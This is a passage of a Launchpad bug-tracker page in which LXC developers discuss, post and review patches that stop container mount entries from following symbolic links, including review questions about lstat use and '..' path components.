          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/16"> #16</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Ah, but there is something we can do:  we can verify that the target path in /proc/self/<wbr />mountinfo is what we expect.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Ah, but there is something we can do:  we can verify that the target path in /proc/self/mountinfo is what we expect.
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/17" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-05T23:03:09.217189+00:00" title="2015-08-05 23:03:09 UTC">on 2015-08-05</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/17"> #17</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4439977/+files/0001-Detect-when-mount-entry-targets-are-symbolic-links.patch">0001-Detect-when-mount-entry-targets-are-symbolic-links.patch</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4439977">Edit</a>
        (4.5 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>An alternative proposed patch which verifies that mounts were not on symlinks after the fact using /proc/self/<wbr />mountinfo.</p>
<p>Since mounts are made in a private namespace and lxc has made every effort to first force all mounts to MS_SLAVE, this should be safe.  Upon failure, lxc will report an error and fail/stop the container startup.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">An alternative proposed patch which verifies that mounts were not on symlinks after the fact using /proc/self/mountinfo.

Since mounts are made in a private namespace and lxc has made every effort to first force all mounts to MS_SLAVE, this should be safe.  Upon failure, lxc will report an error and fail/stop the container startup.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/18" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-06T06:04:55.747818+00:00" title="2015-08-06 06:04:55 UTC">on 2015-08-06</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/18"> #18</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Patch combining two approaches.</p>
<p>While it has the allure of trying all the harder to prevent symlinks, it also does result in more complicated code.  I&#x27;m not sure which we should go with.</p>
<p>(Note that while the two original approaches were independently tested, this patch has not been tested.  In fact the support for file mounts has not been tested even individually)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Patch combining two approaches.

While it has the allure of trying all the harder to prevent symlinks, it also does result in more complicated code.  I'm not sure which we should go with.

(Note that while the two original approaches were independently tested, this patch has not been tested.  In fact the support for file mounts has not been tested even individually)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/19" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-07T21:03:55.767947+00:00" title="2015-08-07 21:03:55 UTC">on 2015-08-07</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/19"> #19</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4441280/+files/0001-Detect-when-mount-entry-targets-are-symbolic-links.patch">Fixed version of the combined patch</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4441280">Edit</a>
        (9.5 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/20" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-09T05:52:15.018374+00:00" title="2015-08-09 05:52:15 UTC">on 2015-08-09</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/20"> #20</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hm, more problems with the chdir+mount approach - the susequent attempt to fix up readonly bind mounts results in</p>
<p>[pid 30540] mount(&quot;.&quot;, &quot;.&quot;, 0x7fffca438669, MS_RDONLY|<wbr />MS_REMOUNT|<wbr />MS_BIND, NULL) = -1 EINVAL (Invalid argument)</p>
<p>(with a fix to the posted patch to mount mountentry onto itself rather than fsname in the REMOUNT case)</p>
<p>So I&#x27;m really tempted to suggest going with the simpler patch in comment #17</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hm, more problems with the chdir+mount approach - the susequent attempt to fix up readonly bind mounts results in

[pid 30540] mount(".", ".", 0x7fffca438669, MS_RDONLY|MS_REMOUNT|MS_BIND, NULL) = -1 EINVAL (Invalid argument)

(with a fix to the posted patch to mount mountentry onto itself rather than fsname in the REMOUNT case)

So I'm really tempted to suggest going with the simpler patch in comment #17</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/21" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-12T15:30:42.812239+00:00" title="2015-08-12 15:30:42 UTC">on 2015-08-12</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/21"> #21</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>New idea from Eric Biederman for using /proc/self/fd/N as mount target for the file bind mounts.  I&#x27;ll work on a patch, hopefully this week.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">New idea from Eric Biederman for using /proc/self/fd/N as mount target for the file bind mounts.  I'll work on a patch, hopefully this week.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          

          
              <div class="boardComment">
  <div class="boardCommentDetails">
    
      <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
    
    <time title="2015-09-01 18:08:10 UTC" datetime="2015-09-01T18:08:10.882505+00:00">on 2015-09-01</time>
  </div>
  <div class="boardCommentActivity">
    <table class="bug-activity">
  
    
      <tr>
        <td colspan="2">Changed in lxc (Ubuntu): </td>
      </tr>
    
    <tr>
      <td style="text-align: right;">
        <b>status</b>:
      </td>
      <td>
        New &#8594; In Progress
      </td>
    </tr>
    <tr>
      <td style="text-align: right;">
        <b>importance</b>:
      </td>
      <td>
        Undecided &#8594; High
      </td>
    </tr>
  
</table>
  </div>
</div>
          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/24" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-02T13:42:43.409119+00:00" title="2015-09-02 13:42:43 UTC">on 2015-09-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/24"> #24</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>I&#x27;ve ported the patches to 1.0 and 1.1.  Also made a minor change (reflected in the changelog) to the patch against current git HEAD.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">I've ported the patches to 1.0 and 1.1.  Also made a minor change (reflected in the changelog) to the patch against current git HEAD.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/25" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-02T13:43:06.431029+00:00" title="2015-09-02 13:43:06 UTC">on 2015-09-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/25"> #25</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4456150/+files/0001-Protect-container-mounts-against-symlinks.patch">Patch against 1.0</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4456150">Edit</a>
        (15.2 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/26" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-02T13:43:22.439518+00:00" title="2015-09-02 13:43:22 UTC">on 2015-09-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/26"> #26</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4456151/+files/0001-Protect-container-mounts-against-symlinks.patch">Patch against 1.1</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4456151">Edit</a>
        (15.3 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/27" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-02T13:43:47.673281+00:00" title="2015-09-02 13:43:47 UTC">on 2015-09-02</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/27"> #27</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4456152/+files/0001-Protect-container-mounts-against-symlinks.patch">patch against git HEAD</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4456152">Edit</a>
        (16.3 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/28" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-15T21:18:12.740058+00:00" title="2015-09-15 21:18:12 UTC">on 2015-09-15</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/28"> #28</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hi Serge - I&#x27;ve reviewed the patch against git HEAD and have a couple questions.</p>
<p>1) In mount_entry(), the call to mount(2) is changed to use target as both the source and the destination. I can&#x27;t see why this would be a valid change.</p>
<p>2) In is_file_mount(), the usage of lstat(2) seems odd for a couple reasons:<br />
&nbsp;&nbsp;&nbsp;- If path is a symlink to a directory, the mount will be incorrectly treated as a file mount in safe_mount(). I think stat(2) should be used.<br />
&nbsp;&nbsp;&nbsp;- Error checking of lstat(2) is ignored. I think this should be treated as fatal for most (all?) cases.</p>
<p>3) In open_without_<wbr />symlink(<wbr />), why is curlen decremented after assigning it the return value of strlen(<wbr />prefix_<wbr />skip)? Is it because prefix_skip is somehow guaranteed to have a trailing &#x27;/&#x27; character?</p>
<p>4) open_without_<wbr />symlink(<wbr />) is documented to return -1 upon error but it returns -EINVAL when target doesn&#x27;t start with prefix_skip. (minor)</p>
<p>5) Is there a need to protect against &quot;..&quot; components in open_without_<wbr />symlink(<wbr />)? I&#x27;m thinking of a target of &quot;/foo/../&quot; and a prefix_skip of &quot;/foo&quot;.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hi Serge - I've reviewed the patch against git HEAD and have a couple questions.

1) In mount_entry(), the call to mount(2) is changed to use target as both the source and the destination. I can't see why this would be a valid change.

2) In is_file_mount(), the usage of lstat(2) seems odd for a couple reasons:
   - If path is a symlink to a directory, the mount will be incorrectly treated as a file mount in safe_mount(). I think stat(2) should be used.
   - Error checking of lstat(2) is ignored. I think this should be treated as fatal for most (all?) cases.

3) In open_without_symlink(), why is curlen decremented after assigning it the return value of strlen(prefix_skip)? Is it because prefix_skip is somehow guaranteed to have a trailing '/' character?

4) open_without_symlink() is documented to return -1 upon error but it returns -EINVAL when target doesn't start with prefix_skip. (minor)

5) Is there a need to protect against ".." components in open_without_symlink()? I'm thinking of a target of "/foo/../" and a prefix_skip of "/foo".
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/29" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-09-16T21:15:13+00:00" title="2015-09-16 21:15:13 UTC">on 2015-09-16</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/29"> #29</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Quoting Tyler Hicks (&lt;email address hidden&gt;):<br />
<span class="foldable-quoted">
&gt; Hi Serge - I&#x27;ve reviewed the patch against git HEAD and have a couple<br />
&gt; questions.
</span></p>
<p>Thanks, Tyler.</p>
<p><span class="foldable-quoted">&gt; 1) In mount_entry(), the call to mount(2) is changed to use target as<br />
&gt; both the source and the destination. I can&#x27;t see why this would be a<br />
&gt; valid change.
</span></p>
<p>It appears to me to be more correct.  Since we are doing a remount,<br />
the old source isn&#x27;t really valid any more.  I&#x27;m thinking of it in<br />
terms of</p>
<p>&nbsp;mount --bind /ab /cd<br />
&nbsp;mount -o bind.remount,ro /cd</p>
<p>But I&#x27;ll test with that part undone, and change it back, as I may just<br />
not be thinking right.</p>
<p><span class="foldable-quoted">&gt; 2) In is_file_mount(), the usage of lstat(2) seems odd for a couple reasons:<br />
&gt;    - If path is a symlink to a directory, the mount will be incorrectly treated as a file mount in safe_mount(). I think stat(2) should be used.
</span></p>
<p>Hm, yeah.  I&#x27;ll change that.</p>
<p><span class="foldable-quoted">&gt;    - Error checking of lstat(2) is ignored. I think this should be treated as fatal for most (all?) cases.
</span></p>
<p>My tree has</p>
<p>&nbsp;ret = lstat(path, &amp;sb);<br />
&nbsp;if (ret)<br />
&nbsp;&nbsp;return false;</p>
<p>Oh, you mean that if the lstat (or stat) fails, the whole safe_mount()<br />
should be aborted?  That&#x27;s probably a good thing to fix.</p>
<p><span class="foldable-quoted">&gt; 3) In open_without_<wbr />symlink(<wbr />), why is curlen decremented after assigning<br />
&gt; it the return value of strlen(<wbr />prefix_<wbr />skip)? Is it because prefix_skip is<br />
&gt; somehow guaranteed to have a trailing &#x27;/&#x27; character?
</span></p>
<p>Hm, I don&#x27;t think that&#x27;s guaranteed.</p>
<p><span class="foldable-quoted">&gt; 4) open_without_<wbr />symlink(<wbr />) is documented to return -1 upon error but it<br />
&gt; returns -EINVAL when target doesn&#x27;t start with prefix_skip. (minor)<br />
&gt;<br />
&gt; 5) Is there a need to protect against &quot;..&quot; components in<br />
&gt; open_without_<wbr />symlink(<wbr />)? I&#x27;m thinking of a target of &quot;/foo/../&quot; and a<br />
&gt; prefix_skip of &quot;/foo&quot;.
</span></p>
<p>The container admin cannot change the path being passed to<br />
open_without_<wbr />symlink(<wbr />) without having access to the container config<br />
file, in which case he owns the host (or parent container) end of<br />
story.  But I think it&#x27;s probably worth simply refusing any paths<br />
with &#x27;..&#x27; in them, yes.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Quoting Tyler Hicks (tyhicks@canonical.com):
&gt; Hi Serge - I've reviewed the patch against git HEAD and have a couple
&gt; questions.

Thanks, Tyler.

&gt; 1) In mount_entry(), the call to mount(2) is changed to use target as
&gt; both the source and the destination. I can't see why this would be a
&gt; valid change.

It appears to me to be more correct.  Since we are doing a remount,
the old source isn't really valid any more.  I'm thinking of it in
terms of

	mount --bind /ab /cd
	mount -o bind.remount,ro /cd

But I'll test with that part undone, and change it back, as I may just
not be thinking right.

&gt; 2) In is_file_mount(), the usage of lstat(2) seems odd for a couple reasons:
&gt;    - If path is a symlink to a directory, the mount will be incorrectly treated as a file mount in safe_mount(). I think stat(2) should be used.

Hm, yeah.  I'll change that.

